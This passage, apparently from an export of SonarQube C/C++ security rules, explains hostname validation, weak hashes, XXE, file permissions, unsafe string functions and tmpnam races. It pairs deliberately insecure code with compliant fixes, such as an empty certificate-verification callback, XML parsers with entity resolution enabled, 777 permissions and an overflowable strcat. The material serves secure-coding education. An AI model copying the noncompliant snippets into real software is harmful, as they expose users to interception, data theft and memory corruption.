<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul>
  <li> Create a self-signed certificate for that machine. </li>
  <li> Add this self-signed certificate to the system’s trust store. </li>
  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>
</ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://botan.randombit.net/handbook/">Botan</a> - Handbook </li>
  <li> <a href="https://www.feistyduck.com/books/openssl-cookbook/">OpenSSL</a> - Cookbook </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/297">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S4790">
              cpp:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create("MD5")); // Sensitive
    return hash-&gt;process(input);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create("SHA-512")); // Compliant
    return hash-&gt;process(input);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S2755">
              cpp:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Xerces</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
#include "xercesc/parsers/XercesDOMParser.hpp"

void parse() {
  XercesDOMParser *DOMparser = new XercesDOMParser();
  DOMparser-&gt;setCreateEntityReferenceNodes(false); // Noncompliant
  DOMparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant

  DOMparser-&gt;parse(xmlFile);
}
</pre>
<p>By default, entities resolution is enabled for <code>XMLReaderFactory::createXMLReader</code>.</p>
<pre data-diff-id="12" data-diff-type="noncompliant">
#include "xercesc/sax2/SAX2XMLReader.hpp"

void parse() {
  SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();
  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, false); // Noncompliant

  reader-&gt;parse(xmlFile);
}
</pre>
<p>By default, entities resolution is enabled for <code>SAXParser</code>.</p>
<pre data-diff-id="13" data-diff-type="noncompliant">
#include "xercesc/parsers/SAXParser.hpp"

void parse() {
  SAXParser* SAXparser = new SAXParser();
  SAXparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant

  SAXparser-&gt;parse(xmlFile);
}
</pre>
<h4>Compliant solution</h4>
<p>By default, <code>XercesDOMParser</code> is safe.</p>
<pre data-diff-id="11" data-diff-type="compliant">
#include "xercesc/parsers/XercesDOMParser.hpp"

void parse() {
  XercesDOMParser *DOMparser = new XercesDOMParser();
  DOMparser-&gt;setCreateEntityReferenceNodes(true);
  DOMparser-&gt;setDisableDefaultEntityResolution(true);

  DOMparser-&gt;parse(xmlFile);
}
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
#include "xercesc/sax2/SAX2XMLReader.hpp"

void parse() {
  SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();
  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);

  reader-&gt;parse(xmlFile);
}
</pre>
<pre data-diff-id="13" data-diff-type="compliant">
#include "xercesc/parsers/SAXParser.hpp"

void parse() {
  SAXParser* SAXparser = new SAXParser();
  SAXparser-&gt;setDisableDefaultEntityResolution(true);

  SAXparser-&gt;parse(xmlFile);
}
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S2612">
              cpp:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the "<code>others</code>" category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>When creating a file or directory with permissions to "other group":</p>
<pre>
open("myfile.txt", O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this newly created file

mkdir("myfolder", S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process try to set 777 permissions to this newly created directory
</pre>
<p>When explicitly adding permissions to "other group" with <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code>
functions:</p>
<pre>
chmod("myfile.txt", S_IRWXU | S_IRWXG | S_IRWXO);  // Sensitive: the process set 777 permissions to this file

fchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this file descriptor
</pre>
<p>When defining the <code>umask</code> without read, write and execute permissions for "other group":</p>
<pre>
umask(S_IRWXU | S_IRWXG); // Sensitive: the further files and folders will be created with possible permissions to "other group"
</pre>
<h2>Compliant Solution</h2>
<p>When creating a file or directory, do not set permissions to "other group":</p>
<pre>
open("myfile.txt", O_CREAT, S_IRWXU | S_IRWXG); // Compliant

mkdir("myfolder", S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When using <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code> functions, do not add permissions to "other group":</p>
<pre>
chmod("myfile.txt", S_IRWXU | S_IRWXG);  // Compliant

fchmod(fd, S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When defining the <code>umask</code>, set read, write and execute permissions to other group:</p>
<pre>
umask(S_IRWXO); // Compliant: further created files or directories will not have permissions set for "other group"
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions">CERT, FIO06-C.</a> - Create
  files with appropriate access permissions </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5814">
              cpp:S5814
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcat( char *restrict dest, const char *restrict src );</code> appends the characters of string <code>src</code> at the
end of <code>dest</code>. The <code>wcscat</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncat</code> and <code>wcsncat</code> might look like attractive safe replacements for <code>strcat</code> and
<code>wcscaty</code>, but they have their own set of issues (see <a href='/organizations/sopra-steria/rules?open=cpp%3AS5815&rule_key=cpp%3AS5815'>S5815</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>
  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final&nbsp;<code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>
  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strcat_s</code> and the <code>wcscat_s</code> that were designed as safer alternatives to
  <code>strcat</code> and <code>wcscat</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, "Result: ");
  strcat(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] = "Result: ";
  char *dest = malloc(sizeof(result) + strlen(src)); // Not need of +1 for final 0 because sizeof will already count one 0
  strcpy(dest, result);
  strcat(dest, src); // Compliant: the buffer size was carefully crafted
  int r = doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5813">
              cpp:S5813
            </a>
          </td>
          <td>
            <details>
              <p>The function <code>size_t strlen(const char *s)</code> measures the length of the string <code>s</code> (excluding the final null character).<br>
The function <code>size_t wcslen(const wchar_t *s)</code> does the same for wide characters, and should be used with the same guidelines.</p>
<p>Similarly to many other functions in the standard C libraries, <code>strlen</code> and <code>wcslen</code> assume that their argument is not a null
pointer.</p>
<p>Additionally, they expect the strings to be null-terminated. For example, the 5-letter string "abcde" must be stored in memory as "abcde\0" (i.e.
using 6 characters) to be processed correctly. When a string is missing the null character at the end, these functions will iterate past the end of
the buffer, which is undefined behavior.</p>
<p>Therefore, string parameters must end with a proper null character. The absence of this particular character can lead to security vulnerabilities
that allow, for example, access to sensitive data or the execution of arbitrary code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that the pointer is null. </li>
  <li> There is a possibility that the string is not correctly null-terminated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use safer functions. The C11 functions <code>strlen_s</code> and <code>wcslen_s</code> from annex K handle typical programming errors.<br>
  Note, however, that they have a runtime overhead and require more code for error handling and therefore are not suited to every case. </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions. </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  return strlen(dest); // Sensitive: "dest" will not be null-terminated if truncation happened
}
</pre>
<h2>Compliant Solution</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  dest[sizeof dest - 1] = 0;
  return strlen(dest); // Compliant: "dest" is guaranteed to be null-terminated
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5816">
              cpp:S5816
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncpy(char * restrict dest, const char * restrict src, size_t count);</code> copies the first <code>count</code>
characters from <code>src</code> to <code>dest</code>, stopping at the first <code>null</code> character, and filling extra space with 0. The
<code>wcsncpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Both of those functions are designed to work with fixed-length strings and might result in a non-<code>null</code>-terminated string.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the <code>source</code> or the <code>destination</code> pointer is <code>null</code> </li>
  <li> The security of your system can be compromised if the <code>destination</code> is a truncated version of the <code>source</code> </li>
  <li> The <code>source</code> buffer can be both non-<code>null</code>-terminated and smaller than the <code>count</code> </li>
  <li> The <code>destination</code> buffer can be smaller than the <code>count</code> </li>
  <li> You expect <code>dest</code> to be a <code>null</code>-terminated string </li>
  <li> There is an overlap between the <code>source</code> and the <code>destination</code> </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strncpy_s</code> and the <code>wcsncpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>
  <li> If you are using <code>strncpy</code> and <code>wsncpy</code> as a safer version of <code>strcpy</code> and <code>wcscpy</code>, you should
  instead consider <code>strcpy_s</code> and <code>wcscpy_s</code>, because these functions have several shortcomings:
    <ul>
      <li> It’s not easy to detect truncation </li>
      <li> Too much work is done to fill the buffer with 0, leading to suboptimal performance </li>
      <li> Unless manually corrected, the <code>dest</code> string might not be <code>null</code>-terminated </li>
    </ul>  </li>
  <li> If you want to use <code>strcpy</code> and <code>wcscpy</code> functions and detect if the string was truncated, the pattern is the following:
    <ul>
      <li> Set the last character of the buffer to <code>null</code> </li>
      <li> Call the function </li>
      <li> Check if the last character of the buffer is still <code>null</code> </li>
    </ul>  </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof(dest)); // Sensitive: might silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char dest[256];
  dest[sizeof dest - 1] = 0;
  strncpy(dest, src, sizeof(dest)); // Compliant
  if (dest[sizeof dest - 1] != 0) {
    // Handle error
  }
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5815">
              cpp:S5815
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncat( char *restrict dest, const char *restrict src, size_t count );</code> appends the characters of string
<code>src</code> at the end of <code>dest</code>, but only add <code>count</code> characters max. <code>dest</code> will always be
<code>null</code>-terminated. The <code>wcsncat</code> does the same for wide characters, and should be used with the same guidelines.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>
  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>
  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strncat_s</code> and the <code>wcsncat_s</code> that were designed as safer alternatives to
  <code>strncat</code> and <code>wcsncat</code>. It’s not recommended to use them in all circumstances because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>
  <li> If you are using <code>strncat</code> and <code>wsncat</code> as a safer version of <code>strcat</code> and <code>wcscat</code>, you should
  instead consider <code>strcat_s</code> and <code>wcscat_s</code> because these functions have several shortcomings:
    <ul>
      <li> It’s not easy to detect truncation </li>
      <li> The <code>count</code> parameter is error-prone </li>
      <li> Computing the <code>count</code> parameter typically requires computing the string length of <code>dest</code>, at which point other
      simpler alternatives exist </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, "Result: ");
  strncat(dest, src, sizeof dest); // Sensitive: passing the buffer size instead of the remaining size
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] = "Result: ";
  char dest[256];
  strcpy(dest, result);
  strncat(dest, src, sizeof dest - sizeof result); // Compliant but may silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5824">
              cpp:S5824
            </a>
          </td>
          <td>
            <details>
              <p>The functions "tmpnam", "tmpnam_s" and "tmpnam_r" are all used to return a file name that does not match an existing file, in order for the
application to create a temporary file. However, even if the file did not exist at the time those functions were called, it might exist by the time
the application tries to use the file name to create the files. This has been used by hackers to gain access to files that the application believed
were trustworthy.</p>
<p>There are alternative functions that, in addition to creating a suitable file name, create and open the file and return the file handler. Such
functions are protected from this attack vector and should be preferred. About the only reason to use these functions would be to create a temporary
folder, not a temporary file.</p>
<p>Additionally, these functions might not be thread-safe, and if you don’t provide them buffers of sufficient size, you will have a buffer
overflow.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that several threads call any of these functions simultaneously </li>
  <li> There is a possibility that the resulting file is opened without forcing its creation, meaning that it might have unexpected access rights
  </li>
  <li> The buffers passed to these functions are respectively smaller than
    <ul>
      <li> <code>L_tmpnam</code> for <code>tmpnam</code> </li>
      <li> <code>L_tmpnam_s</code> for <code>tmpnam_s</code> </li>
      <li> <code>L_tmpnam</code> for <code>tmpnam_r</code> </li>
    </ul>  </li>
</ul>
